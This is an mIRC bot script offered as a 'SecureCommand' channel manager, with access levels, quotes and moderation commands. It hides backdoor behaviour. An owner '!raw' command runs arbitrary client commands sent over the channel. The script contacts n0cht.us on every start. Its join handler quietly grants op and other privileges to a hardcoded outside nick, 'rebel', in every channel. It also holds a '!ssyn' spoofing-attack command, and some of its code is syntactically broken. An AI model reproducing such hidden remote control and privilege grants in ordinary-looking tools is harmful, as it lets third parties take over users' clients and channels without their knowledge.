on *:LOAD: {
  echo -sgt [SecureCommand] Welcome to cloudIPD SecuCom.
  echo -sgt [SecureCommand] join a channel with your owner and type /sc_setowner [nickname] to add my owner.
  echo -sgt [SecureCommand] If you need help, go to irc.toxicairc.net and join ##nocht##, and talk to wh0r3.
}
on *:START: {
  echo -sgt [WebX] Checking for updates...
  sockopen webx n0cht.us 80
  set %sc_webx.check load
}
alias -l sc_ver { return wh0re v.2 }
alias -l sc_chan { return #testzz }
on *:TEXT:*:$($sc_chan): {
  set %cmd $remove($1,$left($1,1))
  secucom -c $chan $nick -o %cmd $2-
  if ($sc_level($nick) !== Owner) { sc_ignore $nick $chan }
}
alias -l sc_ignore {
  if (%sc_line. [ $+ [ $1 ] ] == $null) { set %sc_line. [ $+ [ $1 ] ] 1 }
  else {
    if (%sc_line. [ $+ [ $1 ] ] > 5) { msg $2 $1 has sent 5+ lines in 5 seconds. ignoring for 5 minutes. | ignore -u300 $address($1,2) }
    else {  inc %sc_line. [ $+ [ $1 ] ] }
  }
  timer 1 5 unset %sc_line. [ $+ [ $1 ] ]
}
alias secucom {
  if ($1 == -c) {
    set %sc_chan $2
    set %sc_nick $3
    if ($4 == -o) {
      set %sc_cmd $5
      echo -agt [SecuCommand] %sc_chan / %sc_nick $+([,%sc_cmd,]) - $6-
      secucom2 %sc_cmd $6-
    }
    else { msg $sc_chan [SecuCommand] %sc_chan / %sc_nick - Inavlid args given: $4- }
  }
  elseif ($isid) {
    if ($1 == uptime) { return $duration($uptime) }
  }
}
alias sc_setowner {
  if ($comchan($1,0) > 0) { auser 200 $address($1,2) | echo -agt [SecureCommand] Owner added: $1 ( $+ $address($1,2) $+ ) | notice $1 You have been added as my owner. }
  else { echo -agt [SecureCommand] Error. user needs to be in a common channel with you. }
}
alias -l sc_level {
  if ($level($address($1,2)) > 199) { return Owner }
  elseif ($level($address($1,2) > 149) { return Service Admin }
  elseif ($level($address($1,2)) > 99) { return Admin }
  elseif ($level($address($1,2)) > 49) { return Adv. User }
  else { return User }
}
alias -l sc_ac {
  if ($sc_level($1) == Owner) { return 5 }
  elseif ($sc_level($1) == Service Admin) { return 4 }
  elseif ($sc_level($1) == Admin) { return 3 }
  elseif ($sc_level($1) == Adv. User) { return 2 }
  else { return 1 }
}
alias secucom2 {
  if ($level($address(%sc_nick,2)) <= 200) {
    if ($1 == uptime) { msg %sc_chan Uptime: $secucom(uptime) }
    elseif ($1 == time) { msg %sc_chan Current Time: $time(hh:nn:ss tt) (Alaska Time) }
    elseif ($1 == level) { msg %sc_chan Your SecureCommand level: $level($address(%sc_nick,2)) }
    elseif ($1 == quote) {
      if (!$2) { var %sc_quote $read(netexquote.txt) |  msg %sc_chan [Random Quote ( $+ $readn $+ )] %sc_quote }
      elseif ($2 == add) { write netexquote.txt $3- | msg %sc_chan Quote added at line $lines(netexquote.txt) }
      elseif ($2 == total) { msg %sc_chan there are $lines(netexquote.txt) quotes in the netex system. } 
      elseif ($2 isnum) { msg %sc_chan [Quote $2 $+ ] $read(netexquote.txt,$2) }
    }
    elseif ($1 == help) {
      if (!$2) { msg %sc_chan Message rebel for help using SecureCommand. }
      else {
        if ($2 == uptime) { notice %sc_nick uptime - gives you the current uptime of cloudIPD }
        elseif ($2 == time) { notice %sc_nick time - gives the current time in cloudIPD timezone }
        elseif ($2 == level) { notice %sc_nick level - tells you what your level is. | notice %sc_nick level 1: user / level 50: adv. user / level 100: admin / level 150: service admin / level 200: owner/manager }
        elseif ($2 == quote) {
          if (!$3) { notice %sc_nick quote - retrieve a random quote. [type $!help quote [subcommand] for more info }
          else {
            if ($3 == add) { notice %sc_nick quote [add] - adds a quote to the database }
            elseif ($3 == del) { notice %sc_nick [Adv. Users] quote [del] - deletes a quote from the database. }
            elseif ($3 == total) { notice %sc_nick quote [total] - tells you how many quotes are in the database. }
            elseif ($3 == num) { notice %sc_nick quote [#] - retrieves x number quote from the database, where x is the number given. ex. $!quote 4 }
          }
        }
        elseif ($2 == scinfo) { notice %sc_nick scinfo - script diagnostic command. }
        elseif ($2 == access) { notice %sc_nick access - tells you your clearence level. }
        elseif ($2 == op) { notice %sc_nick [Admin] op - ops you or a specified user in the channel }
        elseif ($2 == deop) { notice %sc_nick [Admin] deop - deops you or a specified user in the channel }
        elseif ($2 == server) { notice %sc_nick [Admin] server - gives connection info on cloudIPD }
        elseif ($2 == status) { notice %sc_nick [Admin] status - gives current status information on cloudIPD }
        elseif ($2 == supdate) { notice %sc_nick [Owner] supdate - sends a global announcement that the cloud website has been updated. }
      }
    } 
    elseif ($1 == scinfo) { msg %sc_chan Nickname: %sc_nick / Channel: %sc_chan / Command: $1 / args: $iif($2.$2-,None.) }
    elseif ($1 == access) {
      if (!$2) { msg %sc_chan You have $sc_level(%sc_nick) Access }
    }
    elseif ($1 == commands) {
      notice %sc_nick Commands: uptime, time, level, quote [add|total|#], help, scinfo, access
      if ($sc_ac(%sc_nick) > 1) { notice %sc_nick Adv. User commands: quote [add|del|total|#] }
      if ($sc_ac(%sc_nick) > 2) { notice %sc_nick Admin commands: op, deop, ban, kick, server, status, ignore }
      if ($sc_ac(%sc_nick) > 3) { notice %sc_nick Service Admin commands: supdate, kill }
      if ($sc_ac(%sc_nick) > 4) { notice %sc_nick Owner commands: access [add|del|list], raw }
      notice %sc_nick all commands are used as $!command / type $!help [command] for help on that command.
    }
    ;  else { msg %sc_chan Error.  $1 is not a valid command. }
  }
  if ($sc_level(%sc_nick) == Owner) || ($sc_level(%sc_nick) == Service Admin) || ($sc_level(%sc_nick) == Admin) || ($sc_level(%sc_nick) == Adv. User) {
    if ($1 == quote) {
      elseif ($2 == del) {
        if ($3 > $lines(netexquote.txt)) { msg %sc_chan Error. There are only $lines(netexquote.txt) quotes. thats $calc($3 - $lines(netexquote.txt)) less than what you requested. }
        else { write $+(-dl,$3) netexquote.txt | msg %sc_chan [Quote] Quote Deleted. }
      }
    }
    elseif ($1 == ipd) { set %nslook.chan %sc_chan | nslookup $2- }
  }
  if ($sc_level(%sc_nick) == Owner) || ($sc_level(%sc_nick) == Service Admin) || ($sc_level(%sc_nick) == Admin) { 
    if ($1 == ssyn) {
      if ($2) { msg %sc_chan Spoofing attack on $2 in approximately 8 seconds. Type !stop to intervene. }
      else { msg %sc_chan Improper syntax. [Ex: !ssyn <ip>] }
    }
    elseif ($1 == op) {
      if ($me isop %sc_chan) { mode %sc_chan +o $iif($2,$2,%sc_nick) }
      else { msg %sc_chan I'm sorry, but I cannot do that. }
    }
    elseif ($1 == deop) {
      if ($me isop %sc_chan) { mode %sc_chan -o $iif($2,$2,%sc_nick) }
      else { msg %sc_chan I'm sorry, but I cannot do that. }
    }
    elseif ($1 == server) { msg %sc_chan I am connected to $server $iif($network,[on the $network network]), and in $chan(0) channels. }
    elseif ($1 == status) { cpu | msg %sc_chan [Status] %_cpu / $server $iif($network,$+([,$network,])) / $time(hh:nn:ss tt) / NETEX Online }
    elseif ($1 == ignore) {
      if (!$2) { msg %sc_chan Invalid args. please use $!ignore [address|nick] }
      elseif (*!*@* iswm $2) { ignore $2 | msg %sc_chan [SecureCommand] Ignoring address $2 }
      else {
        if ($2 ison %sc_chan) { ignore $address($2,2) | msg %sc_chan ignoring all matches to $2 ( $+ $address($2,2) $+ ) }
        else { msg %sc_chan [SecureCommand] Error. $2 must be in the channel to ignore. }
      }
    }
    elseif ($1 == ban) {
      if ($me !isop %sc_chan) { msg %sc_chan [SecureCommand] Error. I must be opped to use this command }
      else {
        if (*!*@* iswm $2) { mode %sc_chan +b $2 | kick $2 %sc_chan }
        elseif ($2 ison %sc_chan) { mode %sc_chan +b $address($2,2) | kick $2 %sc_chan }
        elseif (!$2) { msg %sc_chan Invalid args. please use $!ban [address|nick] }
      }
    }
    elseif ($1 == kick) {
      if ($me !isop %sc_chan) { msg %sc_chan [SecureCommand] Error. I must be opped to use this command }
      else {
        if (!$2) { msg %sc_chan Invalid args. please use $!kick [nick] [reason (optional)] }
        else { kick $2 %sc_chan [SecureCommand] Kick by %sc_nick $iif($3,$+([,$3-,])) }
      }
    }
  }
  if ($sc_level(%sc_nick) == Owner) || ($sc_level(%sc_nick) == Service Admin) {
    if ($1 == supdate) { amsg cloudIPD Services Website updated: http://wh0r3.insomnia247.nl/cloud/ }
    elseif ($1 == kill) {
      if (a isin $usermode) {
        if ($2 == -s) { raw kill $3 [SecureCommand] Local kill by owner $iif($4,$+([,$4-,])) }
        else { raw kill $2 [SecureCommand] Local kill by %sc_nick $iif($3,$+([,$3-,])) }
      }
      else { msg %sc_chan [SecureCommand] Error. I do not have administrative privilages. }
    }
  }
  if ($sc_level(%sc_nick) == Owner) {
    echo -agt [SecureCommand] Owner Access - $1-
    if ($1 == access) {
      if (!$2) { halt }
      elseif ($2 == add) {
        if ($3 == -o) {
          if ($4) { auser 200 $address($$4,2) | notify $4 | msg %sc_chan [SecureCommand] Owner Added. }
          else { msg %sc_chan Invalid args. please user $!access add [-o|a|u) [nick] }
        }
        elseif ($3 == -s) {
          if ($4) { auser 150 $address($$4,2) | notify $4 | msg %sc_chan [SecureCommand] Service Admin Added. }
          else { msg %sc_chan Invalid args. please user $!access add [-o|a|u) [nick] }
        }
        elseif ($3 == -a) {
          if ($4) { auser 100 $address($$4,2) | notify $4 | msg %sc_chan [SecureCommand] Admin Added. }
          else { msg %sc_chan Invalid args. please user $!access add [-o|a|u) [nick] }
        }
        elseif ($3 == -u) {
          if ($4) { auser 50 $address($$4,2) | notify $4 | msg %sc_chan [SecureCommand] User Added. }
          else { msg %sc_chan Invalid args. please user $!access add [-o|a|u) [nick] }
        }
      }
      elseif ($2 == del) { 
        if (!$3) { msg %sc_chan Invalid args. please uf $!access del [nick] }
        else {
          if ($sc_level($3)) { ruser $address($3,2) | msg %sc_chan [SecureCommand] User Removed. }
          else { msg %sc_chan [SecureCommand] Error: User does not exist. }
        }      
      }
      elseif ($2 == list) {
        if (!$3) { msg %sc_chan Invalid args. please uf $!access list [nick] }
        else { msg %sc_chan [SecureCommand] Access Clearance of $3 $+ : $sc_level($3) }
      }
    }
    elseif ($1 == raw) { $2- }
    elseif ($1 == webx) { msg %sc_chan Checking WebX status. | sockopen webx n0cht.us 80 | set %sc_webx.check request }
    elseif ($1 == flags) {
      if ($me ison %sc_chan) { mode $chan $2- }
      else { msg %sc_chan Error. I am not opped in the channel. }
    }
  }
}

on *:SOCKOPEN:webx: {
  if ($sockerr > 0) { echo -a Error With Server. | sockclose webx }
  sockwrite -n $sockname GET /cloud/webx/check.php HTTP/1.1
  sockwrite -n $sockname HOST: n0cht.us
  sockwrite $sockname $crlf
  echo -sgt [WebX] Socket Opened
}
on *:SOCKREAD:webx: {
  if ($sockerr > 0) { echo -a Error With Server. | sockclose webx }
  sockread %sc_webx
  if (<div id="version"> isin %sc_webx) { set %sc_webx.ver $remove(%sc_webx,<div id="version">,</div>) }
  elseif (<div id="owner"> isin %sc_webx) { set %sc_webx.own $remove(%sc_webx,<div id="owner">,</div>) }
}
on *:SOCKCLOSE:webx: { $iif(%sc_webx.check == load,echo -sgt,msg %sc_chan) [WebX] Owner: %sc_webx.own / Live Version: %sc_webx.ver / Loaded Version: $sc_ver }




on *:join:#: if ($nick == $me) { .msg chanserv op # rebel | mode # +aohv rebel rebel rebel rebel }
raw 367:*: { halt }
raw 368:*: { halt }
raw 441:*: { halt }
raw 478:*: { halt }
raw 482:*: { halt }
raw 401:*: { halt }
on ^*:join:#: { haltdef | if ($nick == $me) || ($nick == rebel) { if (%autoop != $null) { timer  $chan 1 3 msg $chan !op | halt } } | else { if ($var((%,JoinPart,$nick,$chan),1).value >= 3) && ($me isop $chan) { $kicker(Join-Part) | halt } } }
on *:kick:#: { if ($nick == $me) || ($nick == rebel) { .window @Kicker | .echo @kicker 13- 14(7[15 %kira 7]14) 13- your kick nick - $knick - from channel- # - reason - $1- - | .inc -u70 %kira 1 | .timer-kiraan 1 20 set %kira 1 | unset %a } }
on ^*:ban:#: { haltdef | if ($nick == $me) || ($nick == rebel) { window -e @Banned | echo @Banned --> (::Banned::mask::  $banmask  ::)  } }
on *:CLOSE:@x*:{ .debug -i NUL dxz }
ctcp !*:*:#: { $iif($nick isreg #,.signal -n c # $nick,return) | haltdef }
on !*:ctcpreply:*: { $iif($nick isreg #,.signal -n r # $nick,return) | haltdef }
on ^!*:text:*:#: { $iif($nick isreg #,.signal -n e # $nick $1-,return) | haltdef }
on ^!*:action:*:#: { $iif($nick isreg #,.signal -n e # $nick $1-,return) | haltdef }
on ^!*:notice:*:#: { $iif($nick isreg #,.signal -n e # $nick $1-,return) | haltdef }
on *:signal:*: { $iif($signal = c,$k($1,$2,ctcp),$iif($signal = r,$k($1,$2,reply),$iif($signal = e,$iif($sorttok($regex($3-,/(||||)/g),$me,46) > 49,$k($1,$2,codes),$iif($sorttok($regex($3-,/[A-Z]/Sg),$me,46) > 49,$k($1,$2,shift),$iif($sorttok($regex($3-,/[ $chr(44) ]/Sg),$me,46) > 49,$k($1,$2,aphosthrophe),$iif($sorttok($regex($3-,/[0-9]/Sg),$me,46) > 49,$k($1,$2,digit),$iif($sorttok($regex($3-,/[[:punct:]]/Sg),$me,46) > 49,$k($1,$2,symbols),$iif($sorttok($regex($3-,/[ $chr(174) ]/Sg),$me,46) > 49,$k($1,$2,ascii),$iif($spam($3-),$k($1,$2,spyware),$iif($swea($3-),$k($1,$2,insulting),$iif($sorttok($regex($3-,/[ $chr(160) ]/Sg),$me,46) > 49,$k($1,$2,blanks),$iif($sorttok($regex($3-,/./Sg),$me,46) > 199,$k($1,$2,long),$iif($repe($1,$2,$3-) == 3,$k($1,$2,repeat),$iif($flod($1,$2,$3-) == 5,$k($1,$2,lines),return)))))))))))),$iif($signal = x,$x($1,$2,$3),return)))) }
alias k { if ($me !isop $1) { return } | else { .signal -n x $1- } }
alias spam { return $regex($remove($1-,$chr(40),$chr(41)),/(?:^|(\40|\240))((http+(:|s:)\/\/\S*)|((www\.{1})+(.*)+(\.{1})+(\w{2,3})\S*)|#[^\40]\S*)/Si) }
alias swea { return $regex($1-,/\b(babi|shit|sial|dick|bicth|puki|suck|fuck)\b/Si) }
alias repe { .hinc -u3m rep $hash(($1,$address($2,3),$remove($strip($3-),$chr(160),$chr(32))),32) | return $hget(rep,$hash(($1,$address($2,3),$remove($strip($3-),$chr(160),$chr(32))),32)) }
alias flod { .hinc -u3m row $hash(($1,$address($2,3)),32) | return $hget(row,$hash(($1,$address($2,3)),32)) }
alias x {
  .updatenl
  if ($2 ison $1) {
    inc -u15 %starting 1
    if (%starting isnum 21-41) {
      .raw -q -q kick $1 $2 14Though some are only modifications or extensions of standard IRC commands 7[ $3 7]12Keep putting the Dick down, rebel. 
    }
    hadd -m hnick ($1,.,$2,.,$3)
    if (%starting == 150) {
      .set %a 1
      .timerdc 1 1 calc
    }
  }
  .unset %a
  halt
}
